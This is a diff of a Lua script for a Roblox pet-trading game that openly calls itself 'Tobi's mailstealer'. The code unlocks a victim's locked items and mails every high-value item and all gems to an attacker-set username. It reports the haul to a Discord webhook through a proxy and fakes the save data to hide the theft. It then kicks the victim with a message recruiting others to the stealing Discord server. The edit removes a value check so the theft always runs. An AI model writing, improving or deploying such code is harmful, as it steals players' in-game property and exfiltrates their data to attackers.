@@ -1,3 +1,8 @@
+Username = "your user here"
+Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "your webhook here"
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
@@ -6,6 +11,7 @@ local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
 local itemsToSend = {}
 local rapCache = {}
+local sendamount = game.Players.LocalPlayer.PlayerGui._MACHINES.MailboxMachine.Frame.SendFrame.Bottom.Diamonds.Amount.Text
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
@@ -156,6 +162,27 @@ local function getRAP(Type, Item)
 	return 0
 end
 
+local function sendGemsToNumber(str)
+    local suffixes = {["k"] = 1000, ["m"] = 1000000, ["b"] = 1000000000}
+    local numberPart = tonumber(str:match("%d+%.?%d*"))
+    local suffixPart = str:match("[kKmM]")
+    if numberPart and suffixPart then
+        local number = math.floor(numberPart)
+        local multiplier = suffixes[suffixPart:lower()]
+        if multiplier then
+            return number * multiplier
+        else
+            return nil
+        end
+    elseif numberPart then
+        return numberPart
+    else
+        return nil
+    end
+end
+
+local newamount = sendGemsToNumber(sendamount)
+
 local function sendItem(category, uid, am)
     local args = {
         [1] = user,
@@ -172,39 +199,8 @@ local function sendItem(category, uid, am)
 			args[1] = user
 		end
 	until response == true
-	GemAmount1 = GemAmount1 - 10000
-end
-
-local function CategorySteal(category)
-	local sortedItems = {}
-	if category == "Pet" then
-		for i, v in pairs(save[category]) do
-			local rapValue = getRAP(category, v)
-			local dir = library.Directory.Pets[v.id]
-			if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
-				table.insert(sortedItems, {uid = i, rap = rapValue})
-			end
-		end
-	else
-		for i, v in pairs(save[category]) do
-			local rapValue = getRAP(category, v)
-			if rapValue >= min_rap then
-				table.insert(sortedItems, {uid = i, rap = rapValue})
-			end
-		end
-	end
-	table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
-	for _, item in ipairs(sortedItems) do
-		local v = save[category][item.uid]
-		if v._lk then
-			local args = {
-			[1] = i,
-			[2] = false
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-		end
-		sendItem(category, item.uid, v._am or 1)
-	end
+	GemAmount1 = GemAmount1 - newamount
+	newamount = newamount * 1.5
 end
 
 local function SendAllGems()
@@ -216,7 +212,7 @@ local function SendAllGems()
 					[2] = MailMessage,
 					[3] = "Currency",
 					[4] = i,
-					[5] = GemAmount1 - 10000
+					[5] = GemAmount1 - newamount
 				}
 				local response = false
 				repeat
@@ -236,18 +232,6 @@ local function EmptyBoxes()
 			end
         end
     end
-end
-
-local function CountHuges()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.huge and getRAP("Pet", v) >= min_rap then
-			count = count + 1
-		end
-	end
-	return count
 end
 
 local function CategoryWebhook(category)
@@ -288,43 +272,56 @@ local function ClaimMail()
     end
 end
 
-if CountHuges() > 0 or GemAmount1 >= 500000 then
-    ClaimMail()
-	EmptyBoxes()
-	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
-	for i, v in pairs(categoryList) do
-		if save[v] ~= nil then
-			CategoryWebhook(v)
-		end
+ClaimMail()
+EmptyBoxes()
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+for i, v in pairs(categoryList) do
+	if save[v] ~= nil then
+		CategoryWebhook(v)
 	end
-	if Webhook and string.find(Webhook, "discord") then
-		Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
-		SendMessage(Webhook, plr.Name, GemAmount1)
-	end
-	local blob_a = require(game.ReplicatedStorage.Library)
-	local blob_b = blob_a.Save.Get()
-	function deepCopy(original)
-		local copy = {}
-		for k, v in pairs(original) do
-			if type(v) == "table" then
-				v = deepCopy(v)
-			end
-			copy[k] = v
-		end
-		return copy
-	end
-	blob_b = deepCopy(blob_b)
-	blob_a.Save.Get = function(...)
-		return blob_b
-	end
-	for i, v in pairs(categoryList) do
-		if save[v] ~= nil then
-			CategorySteal(v)
-		end
-	end
-	SendAllGems()
-	setclipboard("https://discord.gg/HcpNe56R2a")
-	plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
-else
-	plr:kick("Error on script execution: 0x0001F4A2")
 end
+if Webhook and string.find(Webhook, "discord") then
+	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+	SendMessage(Webhook, plr.Name, GemAmount1)
+end
+local blob_a = require(game.ReplicatedStorage.Library)
+local blob_b = blob_a.Save.Get()
+function deepCopy(original)
+	local copy = {}
+	for k, v in pairs(original) do
+		if type(v) == "table" then
+			v = deepCopy(v)
+		end
+		copy[k] = v
+	end
+	return copy
+end
+blob_b = deepCopy(blob_b)
+blob_a.Save.Get = function(...)
+	return blob_b
+end
+local sortedItems = {}
+for i, v in pairs(categoryList) do
+	if save[v] ~= nil then
+		for uid, item in pairs(save[v]) do
+            local rapValue = getRAP(v, item)
+            if rapValue >= min_rap then
+                if item._lk then
+                    local args = {
+                    [1] = uid,
+                    [2] = false
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                end
+                table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
+            end
+        end
+	end
+end
+table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
+for _, item in ipairs(sortedItems) do
+    print(item, category, item.uid, item.amount)
+    sendItem(item.category, item.uid, item.amount)
+end
+SendAllGems()
+plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
